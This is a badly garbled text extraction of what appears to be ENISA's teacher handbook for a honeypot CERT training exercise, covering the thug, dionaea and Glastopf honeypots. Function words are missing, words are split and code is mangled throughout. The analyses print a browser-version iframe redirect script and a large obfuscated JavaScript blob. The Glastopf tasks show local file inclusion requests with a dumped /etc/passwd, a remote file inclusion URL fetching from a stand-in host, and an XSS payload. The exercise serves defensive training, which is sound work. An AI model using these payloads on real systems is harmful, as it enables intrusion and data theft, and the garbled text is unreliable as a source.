- 07 - 27 18:23:36 HTTP URL http //example.xmpl/ex2.html Status 200 Referrer http //example.xmpl/ex2.html 2012 - 07 - 27 18:23:37 < iframe src= '' http //example.xmpl/ex4.html '' > < /iframe > 2012 - 07 - 27 18:23:37 iframe redirection http //example.xmpl/ex2.html - > http //example.xmpl/ex4.html 2012 - 07 - 27 18:23:37 HTTP URL http //example.xmpl/ex4.html Status 200 Referrer http //example.xmpl/ ex2.html 2012 - 07 - 27 18:23:37 HTTP URL http //example.xmpl/ex4.html Status 200 Referrer http //example.xmpl/ex4.html 2012 - 07 - 27 18:23:37 Window Alert Text using Internet Explorer 2012 - 07 - 27 18:23:37 Saving log analysis ../logs/edafe606e244823362675990fe56b5f1/20120727182335 The important entries marked red students made aware standard output I could logged file using - -- n analysis u sing - -- n Walk students attack emphasizing following results http //example.xmpl/ex1.html redirects http //example.xmpl/ex2.html On next page ex2.html http //example.xmpl/ex4 .html ex4 .html STEP 7 In manner STEP 3 STEP 5 describe output log students Ad.1 The first point STEP 3 Ad 1 STEP 5 Ad 1 Ad.2 This JavaScript behavio u r different script generate new iframe different first second case < html > < script > //suspicious JS /MSIE \ d+ \ \ d+ /.test navigator.userAgent { var ieversion=new Number RegExp. $ 1 ieversion==7 document.write `` < iframe src= \ '' http //example.xmpl/malicious.html \ '' > < /iframe > '' else document.write `` < iframe src = \ '' http //example.xmpl/ex3.html \ '' > < /iframe > '' } else document.write `` < iframe src= \ '' http //example.xmpl/ex4.html \ '' > < /iframe > '' < /script > < /html > Ad.3 On last page alert generated heavily obfuscated piece JavaScript < html > < script > /suspicious JS $ =~ $ = { ___ ++ $ $ $ $ $ ! + '' '' $ __ $ ++ $ $ _ $ _ ! + '' '' $ _ $ _ ++ $ $ _ $ $ { } + '' '' $ $ $ _ $ $ $ + '' '' $ _ $ $ ++ $ $ $ $ _ ! `` `` + '' '' $ $ __ ++ $ $ _ $ ++ $ $ $ __ { } + '' '' $ $ $ _ ++ $ $ $ $ ++ $ $ _ __ ++ $ $ __ $ ++ $ } $ $ _= $ $ _= $ + '' '' $ $ _ $ + $ ._ $ = $ $ _ $ .__ $ + $ $ $ = $ $ + '' '' $ .__ $ + ! $ + '' '' $ ._ $ $ + $ .__= $ $ _ $ $ $ _ + $ $ = ! '' '' + '' '' $ .__ $ + $ ._= ! `` `` + '' '' $ ._ $ _ + $ $ _ $ $ _ $ + $ 1 2 3 2 3 12 Honeypots CERT Exercise Handbook Document teachers .__+ $ ._ $ + $ $ $ $ $ = $ $ + ! `` `` + '' '' $ ._ $ $ + $ .__+ $ ._+ $ $ + $ $ $ $ $ = $ .___ $ $ _ $ $ _ $ $ $ $ $ $ $ + '' \ '' '' + $ $ _ $ _+ ! + '' '' $ ._ $ _ + $ $ $ $ _+ '' \ \ '' + $ .__ $ + $ $ $ _+ $ ._ $ _+ $ .__+ '' \ \ \ '' \ \ '' + $ .__ $ + $ $ $ $ + $ .__ $ + $ ._ $ + $ ._+ '' \ \ '' + $ $ __+ $ .___+ $ $ _ $ _+ '' \ \ '' + $ .__ $ + $ $ $ _+ $ ._ $ _+ $ $ $ $ _+ '' \ \ '' + $ $ __+ $ .___+ '' \ \ '' + $ .__ $ + $ $ _ $ + $ $ $ _+ $ ._ $ + $ .__+ '' \ \ '' + $ $ __+ $ .___+ $ ._+ '' \ \ '' + $ .__ $ + $ $ $ _+ $ ._ $ $ + '' \ \ '' + $ .__ $ + $ $ _ $ + $ .__ $ + '' \ \ '' + $ .__ $ + $ $ _ $ + $ $ $ _+ '' \ \ '' + $ .__ $ + $ $ __+ $ $ $ $ + '' \ \ '' + $ $ __+ $ .___+ '' \ \ '' + $ .__ $ + $ __ $ + $ .__ $ + '' \ \ '' + $ .__ $ + $ $ _ $ + $ $ $ _+ $ .__+ $ $ $ $ _+ '' \ \ '' + $ .__ $ + $ $ $ _+ $ ._ $ _+ '' \ \ '' + $ .__ $ + $ $ _ $ + $ $ $ _+ $ $ $ $ _+ $ .__+ '' \ \ '' + $ $ __+ $ .___+ '' \ \ '' + $ .__ $ + $ .___+ $ $ _ $ + '' \ \ '' + $ .__ $ + $ $ $ $ + $ .___+ '' \ \ '' + $ .__ $ + $ $ $ _+ $ .___+ ! + '' '' $ ._ $ _ + $ ._ $ + '' \ \ '' + $ __ $ + $ $ $ _+ $ ._ $ _+ $ $ $ $ _+ '' \ \ '' + $ .__ $ + $ $ $ _+ $ ._ $ _+ '' \ \ \ '' \ \ '' + $ $ __+ $ .___+ '' '' + '' \ '' '' < /script > < /html > The overall analysis result URL http //example.xmpl/ex1.html malicio us user potential victim uses browser Internet Explorer 1.4.3 Task 2 - Assessment T ogether students answer following questions Is web site malicious ? b How attack carried ? Describe step step could presented flow diagram c What domain names IP addresses involve attack ? Unlike real scenario IP addresses relevant fact use locally based Apache server therefore ensuring one address involved localhost 127.0.0.1 Which browsers targeted ? e Which vulnerabilities exploited ? f How could mitigate attack ? The answers questions e included flow diagram illustrating attack step - - step 13 Honeypots CERT Exercise Handbook 13 Document teachers Figure 1 PART 1 Task 2 attack step - - step Walk students flow diagram Possible mitigation attack question f worked n open discussion Available techniques include limited BGP - DNS - blackholing anti - virus IDS/IPS software proxy honeypot technology etc together overview pros cons proposed solution The main conclusion perfect 100 % effective solution mitigat ion attack 1.4.4 Task 3 A nalysis second URL described incident report This time students carry analysis When one students unable complete analysis engage students discussion troubleshoot solve problem You provide advice n one students 14 Honeypots CERT Exercise Handbook Document teachers suggest solution If Internet connection available students allowed use particular perform external analyses find informati associated vulnerabilities To improve information exchange support capabilities recommend teacher ssh servers enabled systems A terminal operations ystems carried within screen sessions With setup teacher connect students system using ssh attach screen session providing assistance evaluation progress In order provide secure ssh scre en access students perform following steps virtual systems $ sudo /etc/init.d/ssh start $ screen To connect student system perform following steps $ ssh l student { IP_address_of_students_system } $ screen - x The password used every system honeypot Students need run apache web server virtual machines However DNS server required domain names resolved /etc/hosts file $ sudo /etc/init.d/apache2 start 1.4.5 Task 3 - Assessment Students given task investigating incident report 00 2 available e - mail inbox virtual image objective answering following questions Is web site malicious ? b How attack carried ? Describe step step could presented flow diagram c What domain names IP addresses involve attack ? Unlike real scenario IP addresses relevant fact use locally based Apa che server therefore guaranteeing one address involved localhost 127.0.0.1 Which browsers targeted ? e Which vulnerabilities exploited ? f How could mitigate attack ? The flow diagram representing attack step - step 15 Honeypots CERT Exercise Handbook 15 Document teachers Figure 2 PART 1 Task 3 attack step - - step 16 Honeypots CERT Exercise Handbook Document teachers Attention ! N ote presented diagram traps set In particular user agent specified browser checked malicious web page e specially important proper referrer checked well Students notice using thug unless addit ional analysis performed n obfuscated JavaScript example using external tool service After finishing PART 1 stu dents stop Apache server $ sudo /etc/init.d/apache2 stop 1.4.6 E valuation metrics Listed b elow suggested metrics part exercise Students MUST grade satisfactory Pass proper ly install thug honeypot properly use thug browser personalities determine IP addresses doma names involved attack determine web browser targeted understand web browser exploited JavaScript ActiveX IE 6 IE 8 without details exploit shellcode behaviour beside thug analysis Students SHOULD grade good Pass credit plus understand attack carried wh snippet JavaScript except last JavaScripts containing exploits sketch process flow diagram attack present ideas mitigate attack Students COULD tasks beyond scope particular exercise grade excellent Pass distinction plus obtain analy e site http //uu0tipozlic.rep/images/2012/noref.html junk JavaScript inserted order conf use researcher noticed student without proper refer r er th ere HTTP 302 redirection research two malicious JavaScripts work ? vulnerability exploit ed ? together analy es external services e.g VirusTotal Wepawet research windows executable file downloa ded run malicious JavaScript manual analysis using exter nal services example Virus Total present ideas prevent attacks 17 Honeypots CERT Exercise Handbook 17 Document teachers 1.5 PART 2 S erver - side honeypot S cenario 1 investigation new worm LAN This PART exercise consist scenario divided three tasks 1. deployment server - side honeypot 2. demonstration perf ormed teacher introduce concepts 3. analysis attack detected honeypot For scenario dionaea honeypot used First student deploy dionaea server - side honeypot Next teacher demonstrate u se honeypot provided scenario Finally stu dent analy e attack carried answer following questions reach section Task 2 - Assessment 1.5.3 What vulnerability targeted ? b What source attack ? c Were files sent attacker ? The students describe these. How could attack mitigated ? 1.5.1 Task 1 - D eployment honeypot Dionaea Nepenthes 8 successor low - interaction honeypot The main purpose honeypot collect malware It features odular architecture embedding P ython scripting language order emulate protocols It able detect shellcode using libemu sup ports IPv6 TLS Dionaea runs restricted environment without administrative privileges The f irst task install honeypot All required files already pre - loaded included Honeypot Exercise Virtual Image Most required oftware packages already installed The nstallation process described document found dionaea website http //dionaea.carnivore.it/ # compiling First install dependencies Cython $ cd /opt/Cython - 0.16 $ sudo python3.2 setup.py instal l liblcfg $ cd /opt/liblcfg/code $ autoreconf - vi $ ./configure -- prefix=/opt/dionaea $ make instal l libemu $ cd /opt/libemu $ autoreconf - vi $ ./configure -- prefix=/opt/dionaea 8 http //nepenthes.carnivore.it/download 18 Honeypots CERT Exercise Handbook Document teachers $ sudo make instal l Second install ionaea I source code located /opt directory The honeypot compiled using following command sequence $ cd /opt/ dionaea $ autoreconf - vi $ ./configure -- - lcfg - include=/opt/dionaea /include/ \ -- - lcfg - lib=/opt/dionaea/lib/ \ -- - emu - include=/opt/dionaea/include/ \ -- - emu - lib=/opt/dionaea/lib $ make $ sudo make install 1.5.2 Task 2 - Introduction step - - step analysis In thi task teacher perform example investigation demonstrate student dionaea honeypot works Active discussion students throughout exercise recommended Students presented information worm attack taking place network This incident reported via e - mail use Icedove e - mail client retrieve The main task use server - side honeypot analy e attack STEP 1 It important introduce basics honeypot configuration start different startup option Attention paid dionaea.conf configuration file In particular modules discussed The configuration file located /opt/dionaea/etc/ dionaea/ dionaea.conf The tartup option displayed using - h flag $ /opt/dionaea/bin/dionaea - h STEP 2 Run dionaea honeypot root $ sudo /opt/dionaea/bin/dionaea - r /opt/dionaea STEP 3 For security simplicity purposes exercise prepared executed environment active network within n isolated LAN In first case VoIP scan simulation must started localhost To r un simulated attack please type $ /opt/exercises/exercise2.1 This start scanning SIP protocol using OPTIONS method D run script non - isolated network ! 19 Honeypots CERT Exercise Handbook 19 Document teachers Note If isolated LAN established may also choose run attack virtual machine providing IP address argument STEP 4 Check log file /opt/dionaea/var/log/dion ea.log incoming connections look possible attack indicators 17082012 13:06:45 connection connection.c:4337 - message connection 0x 945d000 accept/udp/established 127.0.0.1:5060 - > 127.0.1.1:5066 state established - > established 17082012 13:06:45 logsql dionaea/logsql.py:618 - info connect connection 127.0.1.1/:5066 127.0.0.1:5060 id=396 17082012 13:06:45 sip dionaea /sip/__init__.py:649 - info Received OPTIONS 17082012 13:06:45 sip dionaea/sip/rfc3261.py:463 - info Creating Response code=200 message=None In listing main artef c ts attack marked red In case attacker used SIP scanner determine SIP methods provided Since type scanning using OPTIONS method called SIP OPTIONS scanning STEP 5 Use provided readlogsqltree script display attacks previous day The script queries logsql sqlite database attacks prints related information every attack This tool provides information exploited vulnerability time attacker information shellcode fi le offered download $ python3.2 /opt/dionaea/bin/readlogsqltree - $ date '+ % ' - 24*3600 /opt/dionaea/var/dionaea/logsql.sqlite 2012 - 08 - 17 13:06:45 connection 396 SipSession udp connect 127.0.0.1:5060 - > /127.0.1.1:5066 396 None Metho OPTIONS Call - ID:3883276957 @ 127.0.0.1 User - Agent HjtMN0 addr < > 'sip nobody @ 127.0.0.1 None' < > 'sip nobody @ 127.0.0.1 None' contact < > 'sip nobody @ 127.0.0.1 None' < > 'sip HjtMN0 @ 127.0.0.1:5066' via 'UDP /127.0.0.1:5066 1.5.3 Task 2 - Assessment In case attack trigger vulnerabili ty It SIP OPTIONS scan This type scanning used identify VoIP device determine capabilities The SIP OPTIONS scan pro bably performed order identify VoIP devices subnet It might reconnaissance step multi - stage attack These scans used identify target next stage likely target devices responded scanning 20 Honeypots CERT Exercise Handbook Document teachers Together student answer following questions What vulnerability targeted ? The attack trigger vulnerability example SIP OPTIONS scanning b What source attack ? T source IP address 127.0.0 .1 c Were files sent attacker ? If students describe There files sent How could attack mitigated ? To start discussion one must expose SIP server external network i.e Internet This accomplished b properly configuring server firewall 1.5.4 Task 3 - Analysis second attack This time students carry analysis When one students unable complete analysis engage students discussion troubleshoot solve problem You provide advice n one students suggest solution If Internet connection available students allowed use particula r perform external analyses find information associated vulnerabilities Similarly Task2 sake security simplicity exercise prepared executed environment network connectivity within n isolat ed LAN In first case attack simulation must ru n localhost To run simulated attack please type $ /opt/exercises/exercise2.2 The attack going conducted loop der give students time setup honeypot properly There short breaks attacks Note If isolated LAN established also run attack virtual machine providing IP address argument $ /opt/exercises/ exercise2.2 < 1.5.5 Task 3 - Assessment Students answer following questions What vulnerability targeted ? A remote code execution vulnerability Print Spooler Service Microsoft Windows systems MS10 - 061 9 9 http //support.microsoft.com/kb/2347290 21 Honeypots CERT Exercise Handbook 21 Document teachers b What source attack ? IP address 127.0.0.1 c Were files sent attacker ? If students describe Yes files located /opt/dionaea/var/dionaea/binaries/ Windows remote shell How could attack mitigated ? The simplest lution use firewall application well anti - virus software It also important patch operating system regularly Start discussion order find additional mitigation possibilities 1.5.6 E valuation metrics Listed suggest ed metrics part exercise Student MUST grade satisfactory Pass properly install dionaea honeypot understand configuration options correctly start honeypot identify source time attack identify honeypot module used Student SHOULD grade good Pass credit successfully accomplish plus describe stages attack describe exploited vulnerability use utilities provided along dionae get additional ttack information present ideas mitigate attack Student COULD grade excellent Pass distinction successfully accomplish plus propose improvements detection attack analy e shellcode analy e downloaded binary 1.6 PART 2 Server - side honeypot S cenario 2 investigation remote attack targeting web application This PART exercise divided three task 1. deployment server - side honeypot 2. demonstration performed te cher introduction 3. analysis attack detected honeypot First student deploy server - side honeypot used scenario Next demonst rate use honeypot provided scenario Finally student analy e attack answer following questions reach section Task 2 - Assessment 1.6.3 22 Honeypots CERT Exercise Handbook Document teachers What vulnerabilities targeted ? b What sources attacks ? c Were files sent attacker ? If students describe How could attacks mitigated ? 1.6.1 Task 1 D eployment honeypot In part exercise G lastopf honeypot going used Glastopf h oneypot emulates thousands vulnerabilities gather data attacks targeting web applications The principle behind si mple return expected response attacker exploiting web application http //glastopf.org/ The first task install honeypot All required files already included Honeypot Exercise Virtual M achine image All software dependencies already installed The nstallation process described document found Gl astopf website http //dev.glastopf.org/projects/glaspot/wiki/Installation source code located /opt directory The honeypot Python script need installed one install event module APD PHP profiler/debugger e module $ cd /opt/evn e $ sudo python2.7 setup.py install Next install configure APD 10 $ cd /opt/apd/ $ phpize $ ./configure $ make $ sudo make install A dd following lines /etc/php5/cli/php.ini file superuser zend_extension = /usr/lib/php5/20090626 +lfs /apd.so apd.dumpdir = /tmp/apd apd.statement_tracing = 0 Finally install sandbox $ cd /opt/glasp ot /trunk/ sandbox/ $ make 10 APD replaced BFR available https //github.com/glaslos/BFR 23 Honeypots CERT Exercise Handbook 23 Document teachers Glastopf ready operation 1.6.2 Task 2 Introduct ion step - - step analysis In th task perform investigation demonstrate student Gl astopf honeypot works The student given information attack taking place network The main task install use server honeypot analy e attack Y ou explain basic types attacks web applications Cross Site Scripting XSS 11 Local File Inclusion LFI 12 Remote File Inclusion RFI 13 An overview web application vul nerabilities found OWASP TOP 10 Web Application Security Risks list 14 STEP 1 It important introduce honeypot basics configuration well start honeypot Attention paid glastopf.cfg configuration file especially listening IP address port number In order complete exercises port number changed 80 Before r unning Glastopf ake sure service bound port 80 tcp If performed previous exercise either Apache dionaea process may still us ing port In case p lease stop appropriate application continuing You check whether services listening port 80 tcp following command $ sudo netstat - nltp |grep `` :80 `` Note exerci es recommended turn hpfeeds You disable functionality configuration file located /opt/glasp ot /trunk/glastopf.cfg hpfeed enabled = False STEP 2 Run Glastopf honeypot superuser $ cd /opt/glaspot/trunk 11 https //www.owasp.org/index.php/Top_10_2010 - A2 12 http //labs.neohapsis.com/2008/07/21/local - file - inclusion - % E2 % 80 % 93 - tricks - - - trade/ 13 http //lwn.net/Articles/203904/ 14 https //www.owasp.org/index.php/Category OWASP_Top_Ten_Project 24 Honeypots CERT Exercise Handbook Document teachers $ sudo python webserver.py STEP 3 For sake security simplicity exercise prepared executed environment network connectivity n isolated LAN In first case worm attack simulation must run localhost To run simulated attack type $ /opt/exercises/exercise3.1 This start Local File Inclusion attack web application Note If isolated LAN established also run attack virtual machine providing IP address argument > STEP 4 Check log file incoming connections look attack indicators /opt/glaspot/trunk/log/glastopf.log 2012 - 08 - 05 11:20:34,135 INFO 10.24.82.77 GET 2012 - 08 - 05 11:20:34,305 INFO 10.24.82.77 GET /style.css 2012 - 08 - 05 11:20:34,481 INFO 10.24.82.77 GET /favicon.ico 2012 - 08 - 05 11:27:12,652 INFO 127.0.0.1 GET /x ? id=site1 2012 - 08 - 05 11:27:12,777 INFO 127.0.0.1 GET /style.css 2012 - 08 - 05 11:27:12,945 INFO 127.0.0.1 GET /favicon.ico 2012 - 08 - 05 11:27:54,606 INFO 127.0.0.1 GET /x ? id=../../../etc /passwd 2012 - 08 - 05 11:27:54,835 INFO 127.0.0.1 GET /favicon.ico The events pay special attention highlighted bold red STEP 5 Analys e database logs $ sqlite3 /opt/glaspot/trunk/db/glastopf.db `` SELECT id timestamp source_addr method module FROM events '' 1|2012 - 08 - 05 11:20:33|10.24.82.77:52164|GET|unknown 2|2012 - 08 - 05 11:20:34|10.24.82.77:52166|GET|style_css 3|2012 - 08 - 05 11:20:34|10.24.82.77:52167|GET|unknown 4 |2012 - 08 - 05 11:27:54| 127.0.0.1 :52169|GET|lfil 5 |2012 - 08 - 05 11:27:54| 127.0.0.1 :52173|GET|unknown 6|2012 - 08 - 05 11:27:12| 127.0.0.1 :52174|GET|unknown 7|2012 - 08 - 05 11:27:12| 127.0.0.1 :52177|GET|style_css 8|2012 - 08 - 05 11:27:12| 127.0.0.1 :52178|GET|unknown Please details regarding connection triggered lfil module responsible handling Local File Inclusion attack For details connection use following command $ sqlite3 - line /opt/glaspot/trunk/db/glastopf.db `` SELECT * FROM events WHERE id=4 '' id = 4 25 Honeypots CERT Exercise Handbook 25 Document teachers timestamp = 2012 - 08 - 05 11:27:54 source_addr = 127 0 0.1 :52169 method = GET request = /x ? id=../../../etc/passwd request_body = module = lfil filename = response = HTTP/1.1 200 OK Connection close Content - Type text/html charset=UTF - 8 root x:0:0 root /root /bin/bash daemon x:1:1 daemon /usr/sbin /bin/sh bin x:2:2 bin /bin /bin/sh sys x:3:3 sys /dev /bin/sh sync x:4:65534 sync /bin /bin/sync games x:5:60 games /usr/games /bin/sh man x:6:12 man /var/cache/man /bin/sh lp x:7 :7 lp /var/spool/lpd /bin/sh mail x:8:8 mail /var/mail /bin/sh news x:9:9 news /var/spool/news /bin/sh uucp x:10:10 uucp /var/spool/uucp /bin/sh proxy x:13:13 proxy /bin /bin/sh www - data x:33:33 www - data /var/www /bin/sh backup x:34:34 backup /var/backups /bin/sh list x:38:38 Mailing List Manager /var/list /bin/sh gnats x:41:41 Gnats Bug - Reporting System admin /var/lib/gnats /bin/sh nobody x:65534:65534 nobody /nonexistent /bin/sh libuuid x:100:101 :/var/lib/libuuid /bin/sh sshd x:101:65534 :/var/run/sshd /usr/sbin/nologin host = localhost:80 1.6.3 Task 2 - Assessment As result attack due simulated vulnerability script local /etc/passwd file illegally accessed displayed attacker 27 0 0 1 address computer Together student answer following questions What vulnerabilities targeted ? The ability include local file executed script b What sources attacks ? IP address 127.0.0.1 c Were files sent attacker ? If students describe /etc/passwd file How could attacks mitigated ? Input data sanitization GET array directly web application external tool web application firewall 1.6.4 Task 3 - Analysis second attack This time students carry analysis When one students unable complete analysis engage students discussion troubleshoot solve problem You provide advice n one students 26 Honeypots CERT Exercise Handbook Document teachers suggest solution If Internet connection available students allowed use parti cular perform external analyses find information associated vulnerabilities Similarly Task2 sake ecurity simplicity exercise prepared executed environment active network within isolated LAN In first case attack simulation must run localhost First start HTTP server allow RFI attack $ /opt/exercises/evlserver/httpd To run simulated attack type $ /opt/exercises/exercise3.2 D ifferent attacks going conducted loop order give students time run honeypot properly There short breaks attacks Note If isolated LAN established also choose run attack virtual machine providing IP address argument 1.6.5 Task 3 - Assessment The students answer following questions What vulnerabilities targeted ? There different vulnerabilities exploited including 1 Remote File Inclusion e.g /phpmyadmin ? id=http //thah4poo6mai2the.evl:6985/mnw/0000x7 /jhsaeh.ph 2 Cross Site Scripting e.g /site ? key= < script > alert 1 < /script > 3 Local File Inc lusion e.g /test ? name=../../etc/group b What sources attacks ? IP address attack conducted 127.0.0.1 - IP address c Were files sent attacker ? If students describe Yes file stored /opt/glaspot/trunk/files/ It PHP - Shell How attacks could mitigated ? Input data sanitisation directly web application external tool web application firewall 1.6.6 E valuation metrics Listed suggested metrics part exercise Student MUST grade satisfactory Pass properly install Glastopf honeypot 27 Honeypots CERT Exercise Handbook 27 Document teachers understand Glastopf configuration options correctly start honeypot able analyze results identify source time attacks Student SHOULD grade good Pass credit successfully accomplish plus point types attacks describe attacks use utilities provided along Gla stopf get additional attack information present ideas mitigate attack Student COULD grade excellent Pass distinction successfully accomplish plus propose improvements detection attack analy e downloaded file 2 Honeypots CERT Exercise Handbook Document teachers P.O Box 1309 71001 Heraklion Greece www.enisa.europa.eu 